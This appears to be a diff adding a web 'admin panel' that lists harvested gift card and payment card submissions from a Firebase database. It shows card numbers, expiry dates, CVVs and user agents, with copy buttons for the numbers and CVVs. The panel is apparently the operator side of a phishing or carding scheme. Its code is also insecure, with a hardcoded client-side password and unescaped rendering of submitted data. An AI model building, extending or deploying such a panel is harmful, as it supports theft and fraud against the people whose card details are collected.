@@ -1,0 +1,216 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel - GiftCard Logs</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #0b3d91;
+        margin: 0;
+        padding: 0;
+        color: #fff;
+    }
+    .container {
+        max-width: 1100px;
+        margin: auto;
+        padding: 20px;
+    }
+    h1 {
+        text-align: center;
+        margin-bottom: 20px;
+        text-transform: uppercase;
+        color: #ffd700;
+    }
+    #passwordScreen {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: #0b3d91;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        z-index: 9999;
+    }
+    #passwordScreen input {
+        padding: 10px 15px;
+        font-size: 18px;
+        border: 2px solid #ffd700;
+        border-radius: 5px;
+        outline: none;
+        width: 260px;
+        margin-bottom: 10px;
+    }
+    #passwordScreen button {
+        padding: 10px 20px;
+        background: #ffd700;
+        border: none;
+        font-size: 16px;
+        cursor: pointer;
+        color: #0b3d91;
+        font-weight: bold;
+        border-radius: 5px;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        background: white;
+        color: black;
+        border-radius: 10px;
+        overflow: hidden;
+    }
+    th, td {
+        padding: 12px 10px;
+        border-bottom: 1px solid #ccc;
+        text-align: center;
+    }
+    th {
+        background: #ffd700;
+        color: #0b3d91;
+        font-weight: bold;
+    }
+    tr:hover {
+        background: #f1f1f1;
+    }
+    .copyBtn {
+        padding: 6px 10px;
+        background: #0b3d91;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 12px;
+    }
+    #searchBox {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border-radius: 5px;
+        border: 2px solid #ffd700;
+        font-size: 16px;
+        outline: none;
+    }
+</style>
+</head>
+<body>
+
+<!-- PASSWORD SCREEN -->
+<div id="passwordScreen">
+    <h2>Admin Access</h2>
+    <input type="password" id="adminPass" placeholder="Enter password">
+    <button onclick="unlockAdmin()">Enter</button>
+    <p id="errorMsg" style="color:red; margin-top:10px; display:none;">Incorrect password</p>
+</div>
+
+<div class="container" style="display:none;" id="adminContent">
+    <h1>GiftCard Submissions</h1>
+
+    <input type="text" id="searchBox" placeholder="Search gift card type, number, currency...">
+
+    <table>
+        <thead>
+            <tr>
+                <th>Card Type</th>
+                <th>Currency</th>
+                <th>Amount</th>
+                <th>Card Number</th>
+                <th>Expiry</th>
+                <th>CVV</th>
+                <th>User Agent</th>
+                <th>Time</th>
+            </tr>
+        </thead>
+        <tbody id="dataTable"></tbody>
+    </table>
+</div>
+
+<script>
+/* ------- PASSWORD GATE ------- */
+function unlockAdmin() {
+    const entered = document.getElementById("adminPass").value;
+    const correct = "suwe"; // <<< SET YOUR PASSWORD HERE
+
+    if (entered === correct) {
+        document.getElementById("passwordScreen").style.display = "none";
+        document.getElementById("adminContent").style.display = "block";
+    } else {
+        document.getElementById("errorMsg").style.display = "block";
+    }
+}
+
+/* ------- FIREBASE INIT ------- */
+var firebaseConfig = {
+    databaseURL: "https://stake-f540f-default-rtdb.firebaseio.com/"
+};
+firebase.initializeApp(firebaseConfig);
+
+/* ------- LOAD DATA ------- */
+const tableBody = document.getElementById("dataTable");
+
+firebase.database().ref("submitted_cards").on("value", snapshot => {
+    tableBody.innerHTML = "";
+    let items = [];
+
+    snapshot.forEach(child => {
+        items.push({ id: child.key, ...child.val() });
+    });
+
+    // Sort by newest first
+    items.reverse();
+
+    items.forEach(data => {
+        const row = document.createElement("tr");
+
+        row.innerHTML = `
+            <td>${data.giftCardType || ""}</td>
+            <td>${data.currency || ""}</td>
+            <td>${data.amount || ""}</td>
+
+            <td>
+                ${data.cardCode || ""}
+                <button class="copyBtn" onclick="copyText('${data.cardCode || ""}')">Copy</button>
+            </td>
+
+            <td>${data.expiryDate || "-"}</td>
+
+            <td>
+                ${data.cvv || ""}
+                ${data.cvv ? `<button class='copyBtn' onclick="copyText('${data.cvv}')">Copy</button>` : ""}
+            </td>
+
+            <td>${data.userAgent ? data.userAgent.substring(0, 15) + "..." : ""}</td>
+            <td>${data.time || ""}</td>
+        `;
+
+        tableBody.appendChild(row);
+    });
+});
+
+/* ------- COPY FUNCTION ------- */
+function copyText(text) {
+    navigator.clipboard.writeText(text);
+    alert("Copied: " + text);
+}
+
+/* ------- SEARCH FILTER ------- */
+document.getElementById("searchBox").addEventListener("keyup", function() {
+    const filter = this.value.toLowerCase();
+    const rows = tableBody.getElementsByTagName("tr");
+
+    for (let r of rows) {
+        const txt = r.innerText.toLowerCase();
+        r.style.display = txt.includes(filter) ? "" : "none";
+    }
+});
+</script>
+
+</body>
+</html>
